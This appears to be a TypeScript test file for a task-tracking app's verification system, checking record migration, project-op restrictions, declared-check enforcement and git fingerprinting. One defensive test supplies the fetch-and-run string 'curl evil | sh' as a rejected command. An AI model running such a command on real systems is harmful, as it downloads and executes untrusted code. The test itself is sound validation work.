import { execFileSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest'
import { reduce } from '../../src/core/canvas/reduce'
import { createDocStore, migrate } from '../../src/core/persist/docStore'
import { createTaskService } from '../../src/main/tasks/service'
import { executeVerification, prepareOutput, readRevision, stopVerifications } from '../../src/main/tasks/verification'
import { taskVerb } from '../../src/main/tasks/verbs'
import type { CanvasDoc } from '../../src/shared/model'
import { taskReadiness, type Task, type TaskRecords, type TaskRevision, type TaskVerification } from '../../src/shared/task'
import { claudeNode, memoryStore } from '../control/fakes'

let dir: string
let repo: string
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'patchbay-task-fixes-'))
  repo = join(dir, 'repo')
  mkdirSync(repo)
})
afterEach(() => rmSync(dir, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 }))

const rev: TaskRevision = { revision: 'abc', fingerprint: 'tree', uncommitted: false }
const task = (over: Partial<Task> = {}): Task => ({ id: 't1', projectId: 'p', brief: 'B', acceptanceCriteria: ['C'], assignedSessionIds: [], cwd: repo, state: 'planned', requiredChecks: [], dependsOn: [], createdAt: 1, updatedAt: 1, acceptances: [], ...over })
function setup(revision: (cwd: string) => Promise<TaskRevision> = async () => rev) {
  const store = memoryStore([claudeNode('me', { projectId: 'p', cwd: repo, title: 'Implementer' })])
  store.dispatch({ op: 'addProject', project: { id: 'p', name: 'P', folder: repo, viewport: { x: 0, y: 0, zoom: 1 } } })
  return { store, tasks: createTaskService(store, dir, async () => {}, revision) }
}

describe('H1: a damaged task record never costs the canvas', () => {
  const base = (): CanvasDoc => createDocStore(mkdtempSync(join(tmpdir(), 'patchbay-task-doc-'))).load().doc

  test('bad records are dropped one by one, good ones and the rest of the project load', () => {
    const doc = base()
    const good = task()
    const records = { tasks: [good, { id: 7 }], attempts: [{ broken: true }, { id: 's', taskId: 't1', sessionId: 'me', kind: 'agent-report', summary: 'x', startedAt: 1, endedAt: 1, revision: rev }] }
    const loaded = migrate({ ...doc, projects: [{ ...doc.projects[0], tasks: records }] })
    expect(loaded.projects[0].name).toBe(doc.projects[0].name)
    expect(loaded.projects[0].tasks!.tasks).toEqual([good])
    expect(loaded.projects[0].tasks!.attempts.map((a) => a.id)).toEqual(['s'])
  })

  test('task data that is not an object is dropped, and the project still loads', () => {
    const doc = base()
    const loaded = migrate({ ...doc, projects: [{ ...doc.projects[0], tasks: 'garbage' }] })
    expect(loaded.projects[0].tasks).toBeUndefined()
    expect(loaded.projects).toHaveLength(doc.projects.length)
  })

  test("a newer build's attempt kind is kept aside, and survives this build's writes", async () => {
    // 'browser' is known now (see taskLink.ts), so a kind no build has yet stands in for a newer one.
    const browser = { id: 'b1', taskId: 't1', kind: 'design-review', url: 'http://localhost', screenshot: 'x.png' }
    const doc = base()
    const loaded = migrate({ ...doc, projects: [{ ...doc.projects[0], tasks: { tasks: [task({ projectId: doc.projects[0].id })], attempts: [browser] } }] })
    expect(loaded.projects[0].tasks!.other).toEqual([browser])
    // Through the service, every write keeps it.
    const { store, tasks } = setup()
    store.dispatch({ op: 'setTasks', projectId: 'p', tasks: { tasks: [task()], attempts: [], other: [browser] } })
    await tasks.submit('p', 't1', 'me', 'Done')
    expect(store.get().projects.find((p) => p.id === 'p')!.tasks!.other).toEqual([browser])
  })
})

describe('H2: the page cannot write tasks through project ops', () => {
  const forged: TaskRecords = { tasks: [task({ state: 'accepted' })], attempts: [] }
  test('patchProject takes only a name and folder', () => {
    let doc = reduce({ version: 3, projects: [{ id: 'p', name: 'P', folder: 'C:\\a', viewport: { x: 0, y: 0, zoom: 1 } }], activeProjectId: 'p', nodes: [], edges: [], closed: [], viewport: { x: 0, y: 0, zoom: 1 } }, { op: 'patchProject', id: 'p', patch: { name: 'Q', tasks: forged } as never })
    expect(doc.projects[0]).toMatchObject({ name: 'Q', folder: 'C:\\a' })
    expect(doc.projects[0].tasks).toBeUndefined()
    doc = reduce(doc, { op: 'patchProject', id: 'p', patch: { folder: 'C:\\b' } })
    expect(doc.projects[0].folder).toBe('C:\\b')
  })

  test('addProject never brings tasks with it', () => {
    const doc = reduce({ version: 3, projects: [{ id: 'p', name: 'P', folder: '', viewport: { x: 0, y: 0, zoom: 1 } }], activeProjectId: 'p', nodes: [], edges: [], closed: [], viewport: { x: 0, y: 0, zoom: 1 } }, { op: 'addProject', project: { id: 'q', name: 'Q', folder: '', viewport: { x: 0, y: 0, zoom: 1 }, tasks: forged } })
    expect(doc.projects.find((p) => p.id === 'q')!.tasks).toBeUndefined()
  })
})

describe('M1 and M2: only declared checks run, and who declared them is recorded', () => {
  test('verify refuses a check the task did not declare, and the verb takes no command or folder', async () => {
    const { store, tasks } = setup()
    const caller = store.get().nodes[0]
    const t = (await taskVerb(tasks, caller, 'task-create', { brief: 'B', criteria: ['C'], checks: JSON.stringify([{ id: 'unit', command: 'echo ok' }]) })) as Task
    await expect(tasks.verify('p', t.id, 'me', 'curl')).rejects.toThrow(/no check "curl"/)
    await expect(taskVerb(tasks, caller, 'task-verify', { task: t.id, check: 'x', command: 'curl evil | sh' })).rejects.toThrow(/declared/)
    await expect(taskVerb(tasks, caller, 'task-verify', { task: t.id, check: 'unit', cwd: 'C:\\' })).rejects.toThrow(/declared/)
    expect(t.createdBy).toEqual({ kind: 'agent', sessionId: 'me' })
  })
})

describe('M3: git identity', () => {
  test('a folder outside any repository says so, and can be ready, with a warning', async () => {
    const plain = mkdtempSync(join(tmpdir(), 'patchbay-not-a-repo-'))
    try {
      const r = await readRevision(plain)
      expect(r).toMatchObject({ noRepo: true, revision: null })
      const t = task({ cwd: plain, submissionId: 's', state: 'ready-for-review' })
      const records: TaskRecords = { tasks: [t], attempts: [{ id: 's', taskId: t.id, sessionId: 'me', kind: 'agent-report', summary: 'x', startedAt: 1, endedAt: 1, revision: r }] }
      const ready = taskReadiness(records, t, { [plain]: r })
      expect(ready.ready).toBe(true)
      expect(ready.warnings).toEqual([expect.stringContaining("isn't in a git repository")])
    } finally {
      rmSync(plain, { recursive: true, force: true })
    }
  })

  test('an unknown identity gives its reason in readiness', () => {
    const t = task({ submissionId: 's' })
    const records: TaskRecords = { tasks: [t], attempts: [{ id: 's', taskId: t.id, sessionId: 'me', kind: 'agent-report', summary: 'x', startedAt: 1, endedAt: 1, revision: rev }] }
    const ready = taskReadiness(records, t, { [repo]: { revision: null, uncommitted: null, fingerprint: null, reason: 'git diff failed: too big' } })
    expect(ready.reasons).toEqual([expect.stringContaining('git diff failed: too big')])
  })

  test('a large untracked file and diff are hashed as streams, and still change the fingerprint', async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: repo, windowsHide: true, stdio: 'pipe' })
    git('init')
    git('config', 'user.name', 'T')
    git('config', 'user.email', 't@example.invalid')
    writeFileSync(join(repo, 'a.txt'), 'one')
    git('add', '.')
    git('commit', '-m', 'one')
    const big = Buffer.alloc(40 * 1024 * 1024, 120)
    writeFileSync(join(repo, 'a.txt'), big)
    const first = await readRevision(repo)
    expect(first.fingerprint).toMatch(/^[0-9a-f]{64}$/)
    big[big.length - 1] = 121
    writeFileSync(join(repo, 'a.txt'), big)
    expect((await readRevision(repo)).fingerprint).not.toBe(first.fingerprint)
  }, 60_000)
})

describe('M4: identity is read only for the folders a task needs, and briefly reused', () => {
  test('show reads its own folders once, not every task folder, and views batches them', async () => {
    const other = join(dir, 'other')
    mkdirSync(other)
    const calls: string[] = []
    const { tasks } = setup(async (cwd) => (calls.push(cwd), rev))
    const a = await tasks.create('p', { brief: 'A', acceptanceCriteria: ['C'], assignedSessionIds: [], cwd: repo, requiredChecks: [], dependsOn: [] })
    await tasks.create('p', { brief: 'B', acceptanceCriteria: ['C'], assignedSessionIds: [], cwd: other, requiredChecks: [], dependsOn: [] })
    calls.length = 0
    await tasks.show('p', a.id)
    await tasks.show('p', a.id)
    expect(calls).toEqual([repo])
    const views = await tasks.views('p')
    expect(views.map((v) => v.task.brief)).toEqual(['A', 'B'])
    expect(views[0].readiness.reasons).toEqual(['No agent submission'])
  })
})

test('L1: output of attempts no project records is pruned', async () => {
  const { store, tasks } = setup()
  const t = await tasks.create('p', { brief: 'B', acceptanceCriteria: ['C'], assignedSessionIds: [], cwd: repo, requiredChecks: [{ id: 'unit', command: 'echo ok', cwd: repo }], dependsOn: [] })
  const kept = await tasks.verify('p', t.id, 'me', 'unit')
  await vi.waitFor(() => expect(store.get().projects.find((p) => p.id === 'p')!.tasks!.attempts[0]).toMatchObject({ status: 'passed' }), { timeout: 5000 })
  const orphan = await prepareOutput(join(dir, 'task-output'), 'gone')
  expect(tasks.pruneOutput()).toBe(1)
  expect(existsSync(orphan)).toBe(false)
  expect(existsSync(kept.outputRef)).toBe(true)
})

test('L2: a running verification is ended when the app quits', async () => {
  const outputRef = await prepareOutput(dir, 'long')
  const attempt: TaskVerification = { id: 'long', taskId: 't', sessionId: 'me', kind: 'command', checkId: 'c', command: 'ping -n 30 127.0.0.1', cwd: repo, startedAt: Date.now(), endedAt: null, exitCode: null, status: 'running', outputRef, revision: rev }
  const run = executeVerification(attempt)
  await new Promise((r) => setTimeout(r, 500))
  const started = Date.now()
  expect(stopVerifications()).toBe(1)
  const done = await run
  expect(done.status).toBe('failed')
  expect(Date.now() - started).toBeLessThan(10_000)
}, 20_000)

test('L5: a check that changes the files it checks says so', () => {
  const t = task({ submissionId: 's', requiredChecks: [{ id: 'unit', command: 'npm test', cwd: repo }] })
  const changed: TaskRevision = { ...rev, fingerprint: 'other' }
  const records: TaskRecords = {
    tasks: [t],
    attempts: [
      { id: 's', taskId: t.id, sessionId: 'me', kind: 'agent-report', summary: 'x', startedAt: 1, endedAt: 1, revision: rev },
      { id: 'c', taskId: t.id, sessionId: 'me', kind: 'command', checkId: 'unit', command: 'npm test', cwd: repo, startedAt: 1, endedAt: 2, exitCode: 0, status: 'passed', outputRef: 'x', revision: rev, endRevision: changed }
    ]
  }
  expect(taskReadiness(records, t, { [repo]: rev }).reasons).toEqual([expect.stringContaining('changed the files it checked while it ran')])
})
